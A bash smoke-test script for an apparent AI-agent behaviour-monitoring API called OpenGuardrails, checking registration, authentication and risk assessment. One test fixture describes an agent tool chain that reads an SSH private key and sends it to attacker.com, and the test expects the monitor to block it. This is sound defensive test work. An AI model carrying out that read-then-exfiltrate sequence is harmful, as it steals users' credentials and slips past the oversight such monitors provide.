#!/usr/bin/env bash
# End-to-end smoke test for core API.
# Usage: ./scripts/test-api.sh [base_url]
# Requires: curl, jq

BASE=${1:-http://localhost:3002}
PASS=0
FAIL=0

green() { printf "\033[32m✓ %s\033[0m\n" "$1"; }
red()   { printf "\033[31m✗ %s\033[0m\n" "$1"; }

check() {
  local label=$1
  local got=$2
  local want=$3
  if echo "$got" | grep -q "$want"; then
    green "$label"
    PASS=$((PASS+1))
  else
    red "$label (expected: $want, got: $got)"
    FAIL=$((FAIL+1))
  fi
}

echo "=== OpenGuardrails Core API smoke test ==="
echo "Target: $BASE"
echo ""

# ── Health ──────────────────────────────────────────────────────

HEALTH=$(curl -s "$BASE/health")
check "GET /health → status ok" "$HEALTH" '"status":"ok"'

# ── Registration ─────────────────────────────────────────────────

echo ""
echo "--- Registration ---"

REGISTER=$(curl -s -X POST "$BASE/api/v1/agents/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"test-agent","description":"smoke test"}')

check "POST /register → success" "$REGISTER" '"success":true'
check "POST /register → api_key present" "$REGISTER" '"api_key":"sk-og-'
check "POST /register → claim_url present" "$REGISTER" '"claim_url"'
check "POST /register → verification_code present" "$REGISTER" '"verification_code"'

# Extract API key for subsequent requests
API_KEY=$(echo "$REGISTER" | jq -r '.agent.api_key // empty' 2>/dev/null)
AGENT_ID=$(echo "$REGISTER" | jq -r '.agent.id // empty' 2>/dev/null)

if [ -z "$API_KEY" ]; then
  red "Could not extract API key — jq required. Install jq and retry."
  echo ""
  echo "Registration response:"
  echo "$REGISTER" | python3 -m json.tool 2>/dev/null || echo "$REGISTER"
  exit 1
fi

echo ""
echo "Agent ID : $AGENT_ID"
echo "API Key  : ${API_KEY:0:16}..."
echo ""

# ── Auth checks ──────────────────────────────────────────────────

echo "--- Auth ---"

NO_AUTH=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/v1/behavior/assess")
check "No auth → 401" "$NO_AUTH" "401"

WRONG_KEY=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/v1/behavior/assess" \
  -H "Authorization: Bearer sk-og-wrongkey000000000000000000000000")
check "Wrong key → 401" "$WRONG_KEY" "401"

# Agent is pending_claim — should get 403
PENDING=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/v1/behavior/assess" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{}')
check "Pending_claim agent → 403" "$PENDING" "403"

# ── Force-activate agent for assess tests ───────────────────────
# (In production this happens via email verification)

echo ""
echo "--- Force-activating agent for assess tests ---"
ACTIVATED=$(sqlite3 ./data/openguardrails.db \
  "UPDATE registered_agents SET status='active' WHERE id='$AGENT_ID'; SELECT changes();" 2>/dev/null)

if [ "$ACTIVATED" = "1" ]; then
  green "Agent activated via SQLite"
else
  echo "  (SQLite not available or DB path differs — skipping assess tests)"
  echo ""
  echo "=== Summary: $PASS passed, $FAIL failed ==="
  exit 0
fi

# ── Assess: allow ────────────────────────────────────────────────

echo ""
echo "--- Assess ---"

ALLOW=$(curl -s -X POST "$BASE/api/v1/behavior/assess" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d "{
    \"agentId\": \"$AGENT_ID\",
    \"sessionKey\": \"sess-smoke-001\",
    \"runId\": \"run-smoke-001\",
    \"userIntent\": \"list files in the project\",
    \"toolChain\": [
      {\"seq\":0,\"toolName\":\"Bash\",\"sanitizedParams\":{\"command\":\"ls -la\"},\"outcome\":\"success\",\"durationMs\":12,\"resultCategory\":\"text_small\",\"resultSizeBytes\":200}
    ],
    \"localSignals\": {
      \"sensitivePathsAccessed\": [],
      \"externalDomainsContacted\": [],
      \"patterns\": {\"readThenExfil\":false,\"credentialAccess\":false,\"shellEscapeAttempt\":false,\"crossAgentDataFlow\":false},
      \"intentToolOverlapScore\": 0.8,
      \"riskTags\": []
    },
    \"context\": {\"messageHistoryLength\": 1, \"recentUserMessages\": [\"list files\"]}
  }")

check "Assess benign → success" "$ALLOW" '"success":true'
check "Assess benign → action allow" "$ALLOW" '"action":"allow"'
check "Assess benign → no_risk" "$ALLOW" '"riskLevel":"no_risk"'

# ── Assess: block (readThenExfil) ───────────────────────────────

BLOCK=$(curl -s -X POST "$BASE/api/v1/behavior/assess" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d "{
    \"agentId\": \"$AGENT_ID\",
    \"sessionKey\": \"sess-smoke-002\",
    \"runId\": \"run-smoke-002\",
    \"userIntent\": \"send an email\",
    \"toolChain\": [
      {\"seq\":0,\"toolName\":\"Read\",\"sanitizedParams\":{\"file_path\":\"/home/user/.ssh/id_rsa\"},\"outcome\":\"success\",\"durationMs\":5,\"resultCategory\":\"text_small\",\"resultSizeBytes\":1700},
      {\"seq\":1,\"toolName\":\"WebFetch\",\"sanitizedParams\":{\"url\":\"https://attacker.com/collect\"},\"outcome\":\"success\",\"durationMs\":800,\"resultCategory\":\"text_small\",\"resultSizeBytes\":50}
    ],
    \"localSignals\": {
      \"sensitivePathsAccessed\": [\"SSH_KEY\"],
      \"externalDomainsContacted\": [\"attacker.com\"],
      \"patterns\": {\"readThenExfil\":true,\"credentialAccess\":true,\"shellEscapeAttempt\":false,\"crossAgentDataFlow\":false},
      \"intentToolOverlapScore\": 0.05,
      \"riskTags\": [\"READ_SENSITIVE_WRITE_NETWORK\"]
    },
    \"context\": {\"messageHistoryLength\": 1, \"recentUserMessages\": [\"send an email\"]}
  }")

check "Assess exfil → success" "$BLOCK" '"success":true'
check "Assess exfil → action block" "$BLOCK" '"action":"block"'
check "Assess exfil → critical/high risk" "$BLOCK" '"riskLevel":"critical"\|"riskLevel":"high"'
check "Assess exfil → data_exfiltration anomaly" "$BLOCK" 'data_exfiltration\|credential'

# ── Assess: validation errors ────────────────────────────────────

echo ""
echo "--- Validation ---"

MISSING=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/api/v1/behavior/assess" \
  -H "Authorization: Bearer $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"agentId":"test"}')
check "Missing required fields → 400" "$MISSING" "400"

# ── Summary ──────────────────────────────────────────────────────

echo ""
echo "=== Summary: $PASS passed, $FAIL failed ==="
[ $FAIL -eq 0 ] && exit 0 || exit 1
